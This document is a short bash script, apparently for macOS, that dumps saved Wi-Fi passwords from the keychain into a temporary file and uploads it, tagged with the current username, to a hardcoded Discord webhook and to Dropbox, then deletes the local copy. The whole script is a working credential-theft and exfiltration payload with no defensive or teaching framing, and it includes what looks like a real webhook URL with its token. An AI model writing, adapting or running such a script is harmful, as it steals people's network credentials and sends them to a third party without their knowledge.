#!/bin/bash

# Variables
dc="https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
db="<YOUR_DROPBOX_ACCESS_TOKEN>"
temp_file="/tmp/wifi-pass.txt"

# Function to upload files to Dropbox
function dropbox_upload() {
  local source_file_path=$1
  local target_file_name=$(basename "$source_file_path")
  local target_file_path="/$target_file_name"

  curl -s -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer $db" \
    --header "Content-Type: application/octet-stream" \
    --header "Dropbox-API-Arg: {\"path\": \"$target_file_path\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}" \
    --data-binary @"$source_file_path"
}

# Function to upload files to Discord
function discord_upload() {
  local file_path=$1

  curl -s -X POST "$dc" \
    -F "username=$(whoami)" \
    -F "file1=@$file_path"
}

# Retrieve Wi-Fi passwords
echo "Script started"
echo "Gathering Wi-Fi profiles..."
security find-generic-password -wa > "$temp_file"

# Upload to Dropbox
if [[ -n "$db" ]]; then
  echo "Uploading to Dropbox..."
  dropbox_upload "$temp_file"
  echo "Upload to Dropbox completed"
fi

# Upload to Discord
if [[ -n "$dc" ]]; then
  echo "Uploading to Discord..."
  discord_upload "$temp_file"
  echo "Upload to Discord completed"
fi

# Cleanup
echo "Cleaning up..."
rm "$temp_file"
echo "Cleanup completed"